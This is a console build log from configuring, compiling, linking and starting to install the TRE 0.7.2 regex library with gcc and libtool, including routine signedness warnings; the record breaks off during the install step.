checking for the best optimization flags... -O1 -fomit-frame-pointer

checking for C compiler warning flags... -Wall

checking for an ANSI C-conforming const... yes

checking for inline... inline

checking for egrep... grep -E

checking for ANSI C header files... yes

checking for working alloca.h... yes

checking for alloca... yes

checking for sys/types.h... yes

checking for sys/stat.h... yes

checking for stdlib.h... yes

checking for string.h... yes

checking for memory.h... yes

checking for strings.h... yes

checking for inttypes.h... yes

checking for stdint.h... yes

checking for unistd.h... yes

checking getopt.h usability... yes

checking getopt.h presence... yes

checking for getopt.h... yes

checking for getopt_long... yes

checking for isascii... yes

checking for isblank... yes

checking for special C compiler options needed for large files... no

checking for _FILE_OFFSET_BITS value needed for large files... 64

checking for _LARGE_FILES value needed for large files... no

checking whether NLS is requested... yes

checking for msgfmt... /usr/bin/msgfmt

checking for gmsgfmt... /usr/bin/msgfmt

checking for xgettext... /usr/bin/xgettext

checking for msgmerge... /usr/bin/msgmerge

checking for ld used by GCC... /usr/bin/ld

checking if the linker (/usr/bin/ld) is GNU ld... yes

checking for shared library run path origin... done

checking whether NLS is requested... yes

checking for GNU gettext in libc... yes

checking whether to use NLS... yes

checking where the gettext function comes from... libc

checking for a sed that does not truncate output... /bin/sed

checking for ld used by gcc... /usr/bin/ld

checking if the linker (/usr/bin/ld) is GNU ld... yes

checking for /usr/bin/ld option to reload object files... -r

checking for BSD-compatible nm... /usr/bin/nm -B

checking whether ln -s works... yes

checking how to recognise dependent libraries... pass_all

checking dlfcn.h usability... yes

checking dlfcn.h presence... yes

checking for dlfcn.h... yes

checking the maximum length of command line arguments... 32768

checking command to parse /usr/bin/nm -B output from gcc object... ok

checking for objdir... .libs

checking for ar... ar

checking for ranlib... ranlib

checking for strip... strip

checking if gcc static flag  works... yes

checking if gcc supports -fno-rtti -fno-exceptions... no

checking for gcc option to produce PIC... -fPIC

checking if gcc PIC flag -fPIC works... yes

checking if gcc supports -c -o file.o... yes

checking whether the gcc linker (/usr/bin/ld) supports shared libraries... yes

checking dynamic linker characteristics... GNU/Linux ld.so

checking how to hardcode library paths into programs... immediate

checking whether stripping libraries is possible... yes

checking if libtool supports shared libraries... yes

checking whether to build shared libraries... no

checking whether to build static libraries... yes

configure: creating libtool

configure: creating ./config.status

config.status: creating Makefile

config.status: creating lib/Makefile

config.status: creating src/Makefile

config.status: creating tests/Makefile

config.status: creating po/Makefile.in

config.status: creating m4/Makefile

config.status: creating utils/Makefile

config.status: creating doc/Makefile

config.status: creating tre.pc

config.status: creating tre.spec

config.status: creating doc/agrep.1

config.status: creating config.h

config.status: creating lib/tre-config.h

config.status: executing depfiles commands

config.status: executing default-1 commands

config.status: creating po/POTFILES

config.status: creating po/Makefile





Configuration summary

=====================



TRE is now configured as follows:



* Compilation environment



  CC       = gcc

  CFLAGS   = -O1 -fomit-frame-pointer -Wall

  CPP      = gcc -E

  CPPFLAGS = 

  LD       = /usr/bin/ld

  LDFLAGS  = 

  LIBS     = 

  Use alloca():                       yes



* TRE options



  Development-time debugging:         no

  System regex ABI compatibility:     no

  Wide character (wchar_t) support:   no (disabled with --disable-wchar)

  Multibyte character set support:    no (disabled with --disable-multibyte)

  Approximate matching support:       yes

  Build and install agrep:            no



compiling TRE regex library

make  all-recursive

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2'

Making all in lib

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

make  all-am

make[3]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-ast.lo -MD -MP -MF ".deps/tre-ast.Tpo" -c -o tre-ast.lo tre-ast.c; \

	then mv -f ".deps/tre-ast.Tpo" ".deps/tre-ast.Plo"; else rm -f ".deps/tre-ast.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-ast.lo -MD -MP -MF .deps/tre-ast.Tpo -c tre-ast.c -o tre-ast.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-compile.lo -MD -MP -MF ".deps/tre-compile.Tpo" -c -o tre-compile.lo tre-compile.c; \

	then mv -f ".deps/tre-compile.Tpo" ".deps/tre-compile.Plo"; else rm -f ".deps/tre-compile.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-compile.lo -MD -MP -MF .deps/tre-compile.Tpo -c tre-compile.c -o tre-compile.o

tre-compile.c: In function 'tre_add_tags':

tre-compile.c:367: warning: cast to pointer from integer of different size

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-filter.lo -MD -MP -MF ".deps/tre-filter.Tpo" -c -o tre-filter.lo tre-filter.c; \

	then mv -f ".deps/tre-filter.Tpo" ".deps/tre-filter.Plo"; else rm -f ".deps/tre-filter.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-filter.lo -MD -MP -MF .deps/tre-filter.Tpo -c tre-filter.c -o tre-filter.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-match-backtrack.lo -MD -MP -MF ".deps/tre-match-backtrack.Tpo" -c -o tre-match-backtrack.lo tre-match-backtrack.c; \

	then mv -f ".deps/tre-match-backtrack.Tpo" ".deps/tre-match-backtrack.Plo"; else rm -f ".deps/tre-match-backtrack.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-match-backtrack.lo -MD -MP -MF .deps/tre-match-backtrack.Tpo -c tre-match-backtrack.c -o tre-match-backtrack.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-match-parallel.lo -MD -MP -MF ".deps/tre-match-parallel.Tpo" -c -o tre-match-parallel.lo tre-match-parallel.c; \

	then mv -f ".deps/tre-match-parallel.Tpo" ".deps/tre-match-parallel.Plo"; else rm -f ".deps/tre-match-parallel.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-match-parallel.lo -MD -MP -MF .deps/tre-match-parallel.Tpo -c tre-match-parallel.c -o tre-match-parallel.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-mem.lo -MD -MP -MF ".deps/tre-mem.Tpo" -c -o tre-mem.lo tre-mem.c; \

	then mv -f ".deps/tre-mem.Tpo" ".deps/tre-mem.Plo"; else rm -f ".deps/tre-mem.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-mem.lo -MD -MP -MF .deps/tre-mem.Tpo -c tre-mem.c -o tre-mem.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-parse.lo -MD -MP -MF ".deps/tre-parse.Tpo" -c -o tre-parse.lo tre-parse.c; \

	then mv -f ".deps/tre-parse.Tpo" ".deps/tre-parse.Plo"; else rm -f ".deps/tre-parse.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-parse.lo -MD -MP -MF .deps/tre-parse.Tpo -c tre-parse.c -o tre-parse.o

tre-parse.c: In function 'tre_expand_macro':

tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

tre-parse.c:99: warning: pointer targets in passing argument 2 of 'strncmp' differ in signedness

tre-parse.c: In function 'tre_parse_bracket_items':

tre-parse.c:354: warning: pointer targets in passing argument 2 of 'strncpy' differ in signedness

tre-parse.c: In function 'tre_parse':

tre-parse.c:1369: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-stack.lo -MD -MP -MF ".deps/tre-stack.Tpo" -c -o tre-stack.lo tre-stack.c; \

	then mv -f ".deps/tre-stack.Tpo" ".deps/tre-stack.Plo"; else rm -f ".deps/tre-stack.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-stack.lo -MD -MP -MF .deps/tre-stack.Tpo -c tre-stack.c -o tre-stack.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT regcomp.lo -MD -MP -MF ".deps/regcomp.Tpo" -c -o regcomp.lo regcomp.c; \

	then mv -f ".deps/regcomp.Tpo" ".deps/regcomp.Plo"; else rm -f ".deps/regcomp.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT regcomp.lo -MD -MP -MF .deps/regcomp.Tpo -c regcomp.c -o regcomp.o

regcomp.c: In function 'regncomp':

regcomp.c:108: warning: pointer targets in passing argument 2 of 'tre_compile' differ in signedness

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT regexec.lo -MD -MP -MF ".deps/regexec.Tpo" -c -o regexec.lo regexec.c; \

	then mv -f ".deps/regexec.Tpo" ".deps/regexec.Plo"; else rm -f ".deps/regexec.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT regexec.lo -MD -MP -MF .deps/regexec.Tpo -c regexec.c -o regexec.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT regerror.lo -MD -MP -MF ".deps/regerror.Tpo" -c -o regerror.lo regerror.c; \

	then mv -f ".deps/regerror.Tpo" ".deps/regerror.Plo"; else rm -f ".deps/regerror.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT regerror.lo -MD -MP -MF .deps/regerror.Tpo -c regerror.c -o regerror.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I.     -O1 -fomit-frame-pointer -Wall -MT tre-match-approx.lo -MD -MP -MF ".deps/tre-match-approx.Tpo" -c -o tre-match-approx.lo tre-match-approx.c; \

	then mv -f ".deps/tre-match-approx.Tpo" ".deps/tre-match-approx.Plo"; else rm -f ".deps/tre-match-approx.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I. -O1 -fomit-frame-pointer -Wall -MT tre-match-approx.lo -MD -MP -MF .deps/tre-match-approx.Tpo -c tre-match-approx.c -o tre-match-approx.o

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o libtre.la -rpath /home/jmap82/linux/extras/regexp/lib -version-info 6:2:2  tre-ast.lo tre-compile.lo tre-filter.lo tre-match-backtrack.lo tre-match-parallel.lo tre-mem.lo tre-parse.lo tre-stack.lo regcomp.lo regexec.lo regerror.lo tre-match-approx.lo  

mkdir .libs

ar cru .libs/libtre.a  tre-ast.o tre-compile.o tre-filter.o tre-match-backtrack.o tre-match-parallel.o tre-mem.o tre-parse.o tre-stack.o regcomp.o regexec.o regerror.o tre-match-approx.o

ranlib .libs/libtre.a

creating libtre.la

(cd .libs && rm -f libtre.la && ln -s ../libtre.la libtre.la)

make[3]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

Making all in tests

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-mem.lo -MD -MP -MF ".deps/libxtre_la-tre-mem.Tpo" -c -o libxtre_la-tre-mem.lo `test -f '../lib/tre-mem.c' || echo './'`../lib/tre-mem.c; \

	then mv -f ".deps/libxtre_la-tre-mem.Tpo" ".deps/libxtre_la-tre-mem.Plo"; else rm -f ".deps/libxtre_la-tre-mem.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-mem.lo -MD -MP -MF .deps/libxtre_la-tre-mem.Tpo -c ../lib/tre-mem.c -o libxtre_la-tre-mem.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-stack.lo -MD -MP -MF ".deps/libxtre_la-tre-stack.Tpo" -c -o libxtre_la-tre-stack.lo `test -f '../lib/tre-stack.c' || echo './'`../lib/tre-stack.c; \

	then mv -f ".deps/libxtre_la-tre-stack.Tpo" ".deps/libxtre_la-tre-stack.Plo"; else rm -f ".deps/libxtre_la-tre-stack.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-stack.lo -MD -MP -MF .deps/libxtre_la-tre-stack.Tpo -c ../lib/tre-stack.c -o libxtre_la-tre-stack.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-ast.lo -MD -MP -MF ".deps/libxtre_la-tre-ast.Tpo" -c -o libxtre_la-tre-ast.lo `test -f '../lib/tre-ast.c' || echo './'`../lib/tre-ast.c; \

	then mv -f ".deps/libxtre_la-tre-ast.Tpo" ".deps/libxtre_la-tre-ast.Plo"; else rm -f ".deps/libxtre_la-tre-ast.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-ast.lo -MD -MP -MF .deps/libxtre_la-tre-ast.Tpo -c ../lib/tre-ast.c -o libxtre_la-tre-ast.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-parse.lo -MD -MP -MF ".deps/libxtre_la-tre-parse.Tpo" -c -o libxtre_la-tre-parse.lo `test -f '../lib/tre-parse.c' || echo './'`../lib/tre-parse.c; \

	then mv -f ".deps/libxtre_la-tre-parse.Tpo" ".deps/libxtre_la-tre-parse.Plo"; else rm -f ".deps/libxtre_la-tre-parse.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-parse.lo -MD -MP -MF .deps/libxtre_la-tre-parse.Tpo -c ../lib/tre-parse.c -o libxtre_la-tre-parse.o

../lib/tre-parse.c: In function 'tre_expand_macro':

../lib/tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 2 of '__builtin_strcmp' differ in signedness

../lib/tre-parse.c:99: warning: pointer targets in passing argument 2 of 'strncmp' differ in signedness

../lib/tre-parse.c: In function 'tre_parse_bracket_items':

../lib/tre-parse.c:354: warning: pointer targets in passing argument 2 of 'strncpy' differ in signedness

../lib/tre-parse.c: In function 'tre_parse':

../lib/tre-parse.c:1369: warning: pointer targets in passing argument 1 of 'strlen' differ in signedness

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-compile.lo -MD -MP -MF ".deps/libxtre_la-tre-compile.Tpo" -c -o libxtre_la-tre-compile.lo `test -f '../lib/tre-compile.c' || echo './'`../lib/tre-compile.c; \

	then mv -f ".deps/libxtre_la-tre-compile.Tpo" ".deps/libxtre_la-tre-compile.Plo"; else rm -f ".deps/libxtre_la-tre-compile.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-compile.lo -MD -MP -MF .deps/libxtre_la-tre-compile.Tpo -c ../lib/tre-compile.c -o libxtre_la-tre-compile.o

../lib/tre-compile.c: In function 'tre_add_tags':

../lib/tre-compile.c:367: warning: cast to pointer from integer of different size

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-parallel.lo -MD -MP -MF ".deps/libxtre_la-tre-match-parallel.Tpo" -c -o libxtre_la-tre-match-parallel.lo `test -f '../lib/tre-match-parallel.c' || echo './'`../lib/tre-match-parallel.c; \

	then mv -f ".deps/libxtre_la-tre-match-parallel.Tpo" ".deps/libxtre_la-tre-match-parallel.Plo"; else rm -f ".deps/libxtre_la-tre-match-parallel.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-parallel.lo -MD -MP -MF .deps/libxtre_la-tre-match-parallel.Tpo -c ../lib/tre-match-parallel.c -o libxtre_la-tre-match-parallel.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-backtrack.lo -MD -MP -MF ".deps/libxtre_la-tre-match-backtrack.Tpo" -c -o libxtre_la-tre-match-backtrack.lo `test -f '../lib/tre-match-backtrack.c' || echo './'`../lib/tre-match-backtrack.c; \

	then mv -f ".deps/libxtre_la-tre-match-backtrack.Tpo" ".deps/libxtre_la-tre-match-backtrack.Plo"; else rm -f ".deps/libxtre_la-tre-match-backtrack.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-backtrack.lo -MD -MP -MF .deps/libxtre_la-tre-match-backtrack.Tpo -c ../lib/tre-match-backtrack.c -o libxtre_la-tre-match-backtrack.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regcomp.lo -MD -MP -MF ".deps/libxtre_la-regcomp.Tpo" -c -o libxtre_la-regcomp.lo `test -f '../lib/regcomp.c' || echo './'`../lib/regcomp.c; \

	then mv -f ".deps/libxtre_la-regcomp.Tpo" ".deps/libxtre_la-regcomp.Plo"; else rm -f ".deps/libxtre_la-regcomp.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regcomp.lo -MD -MP -MF .deps/libxtre_la-regcomp.Tpo -c ../lib/regcomp.c -o libxtre_la-regcomp.o

../lib/regcomp.c: In function 'regncomp':

../lib/regcomp.c:108: warning: pointer targets in passing argument 2 of 'tre_compile' differ in signedness

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regexec.lo -MD -MP -MF ".deps/libxtre_la-regexec.Tpo" -c -o libxtre_la-regexec.lo `test -f '../lib/regexec.c' || echo './'`../lib/regexec.c; \

	then mv -f ".deps/libxtre_la-regexec.Tpo" ".deps/libxtre_la-regexec.Plo"; else rm -f ".deps/libxtre_la-regexec.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regexec.lo -MD -MP -MF .deps/libxtre_la-regexec.Tpo -c ../lib/regexec.c -o libxtre_la-regexec.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regerror.lo -MD -MP -MF ".deps/libxtre_la-regerror.Tpo" -c -o libxtre_la-regerror.lo `test -f '../lib/regerror.c' || echo './'`../lib/regerror.c; \

	then mv -f ".deps/libxtre_la-regerror.Tpo" ".deps/libxtre_la-regerror.Plo"; else rm -f ".deps/libxtre_la-regerror.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-regerror.lo -MD -MP -MF .deps/libxtre_la-regerror.Tpo -c ../lib/regerror.c -o libxtre_la-regerror.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-xmalloc.lo -MD -MP -MF ".deps/libxtre_la-xmalloc.Tpo" -c -o libxtre_la-xmalloc.lo `test -f '../lib/xmalloc.c' || echo './'`../lib/xmalloc.c; \

	then mv -f ".deps/libxtre_la-xmalloc.Tpo" ".deps/libxtre_la-xmalloc.Plo"; else rm -f ".deps/libxtre_la-xmalloc.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-xmalloc.lo -MD -MP -MF .deps/libxtre_la-xmalloc.Tpo -c ../lib/xmalloc.c -o libxtre_la-xmalloc.o

if /bin/bash ../libtool --tag=CC --mode=compile gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-approx.lo -MD -MP -MF ".deps/libxtre_la-tre-match-approx.Tpo" -c -o libxtre_la-tre-match-approx.lo `test -f '../lib/tre-match-approx.c' || echo './'`../lib/tre-match-approx.c; \

	then mv -f ".deps/libxtre_la-tre-match-approx.Tpo" ".deps/libxtre_la-tre-match-approx.Plo"; else rm -f ".deps/libxtre_la-tre-match-approx.Tpo"; exit 1; fi

 gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT libxtre_la-tre-match-approx.lo -MD -MP -MF .deps/libxtre_la-tre-match-approx.Tpo -c ../lib/tre-match-approx.c -o libxtre_la-tre-match-approx.o

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o libxtre.la   libxtre_la-tre-mem.lo libxtre_la-tre-stack.lo libxtre_la-tre-ast.lo libxtre_la-tre-parse.lo libxtre_la-tre-compile.lo libxtre_la-tre-match-parallel.lo libxtre_la-tre-match-backtrack.lo libxtre_la-regcomp.lo libxtre_la-regexec.lo libxtre_la-regerror.lo libxtre_la-xmalloc.lo libxtre_la-tre-match-approx.lo  

mkdir .libs

ar cru .libs/libxtre.a  libxtre_la-tre-mem.o libxtre_la-tre-stack.o libxtre_la-tre-ast.o libxtre_la-tre-parse.o libxtre_la-tre-compile.o libxtre_la-tre-match-parallel.o libxtre_la-tre-match-backtrack.o libxtre_la-regcomp.o libxtre_la-regexec.o libxtre_la-regerror.o libxtre_la-xmalloc.o libxtre_la-tre-match-approx.o

ranlib .libs/libxtre.a

creating libxtre.la

(cd .libs && rm -f libxtre.la && ln -s ../libxtre.la libxtre.la)

if gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT retest-retest.o -MD -MP -MF ".deps/retest-retest.Tpo" -c -o retest-retest.o `test -f 'retest.c' || echo './'`retest.c; \

	then mv -f ".deps/retest-retest.Tpo" ".deps/retest-retest.Po"; else rm -f ".deps/retest-retest.Tpo"; exit 1; fi

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o retest -static retest-retest.o libxtre.la  

gcc -O1 -fomit-frame-pointer -Wall -o retest retest-retest.o  ./.libs/libxtre.a

if gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib    -O1 -fomit-frame-pointer -Wall -MT bench.o -MD -MP -MF ".deps/bench.Tpo" -c -o bench.o bench.c; \

	then mv -f ".deps/bench.Tpo" ".deps/bench.Po"; else rm -f ".deps/bench.Tpo"; exit 1; fi

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o bench -static bench.o ../lib/libtre.la -lm  

gcc -O1 -fomit-frame-pointer -Wall -o bench bench.o  ../lib/.libs/libtre.a -lm

if gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib   -DMALLOC_DEBUGGING -O1 -fomit-frame-pointer -Wall -MT randtest-randtest.o -MD -MP -MF ".deps/randtest-randtest.Tpo" -c -o randtest-randtest.o `test -f 'randtest.c' || echo './'`randtest.c; \

	then mv -f ".deps/randtest-randtest.Tpo" ".deps/randtest-randtest.Po"; else rm -f ".deps/randtest-randtest.Tpo"; exit 1; fi

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o randtest -static randtest-randtest.o libxtre.la  

gcc -O1 -fomit-frame-pointer -Wall -o randtest randtest-randtest.o  ./.libs/libxtre.a

if gcc -DHAVE_CONFIG_H -I. -I. -I.. -I../lib -I../lib    -O1 -fomit-frame-pointer -Wall -MT test-str-source.o -MD -MP -MF ".deps/test-str-source.Tpo" -c -o test-str-source.o test-str-source.c; \

	then mv -f ".deps/test-str-source.Tpo" ".deps/test-str-source.Po"; else rm -f ".deps/test-str-source.Tpo"; exit 1; fi

/bin/bash ../libtool --tag=CC --mode=link gcc  -O1 -fomit-frame-pointer -Wall   -o test-str-source  test-str-source.o ../lib/libtre.la -lm  

gcc -O1 -fomit-frame-pointer -Wall -o test-str-source test-str-source.o  ../lib/.libs/libtre.a -lm

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/tests'

Making all in utils

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

make[2]: Nothing to be done for `all'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/utils'

Making all in po

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/po'

make[2]: Nothing to be done for `all'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/po'

Making all in m4

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[2]: Nothing to be done for `all'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2/m4'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2'

make[2]: Nothing to be done for `all-am'.

make[2]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2'

make[1]: Leaving directory `/home/jmap82/linux/extras/tre-0.7.2'

installing TRE regex library

Making install in lib

make[1]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

make[2]: Entering directory `/home/jmap82/linux/extras/tre-0.7.2/lib'

test -z "/home/jmap82/linux/extras/regexp/lib" || mkdir -p -- "/home/jmap82/linux/extras/regexp/lib"

 /bin/bash ../libtool --mode=install /usr/bin/install -c  'libtre.la' '/home/jmap82/linux/extras/regexp/lib/libtre.la'

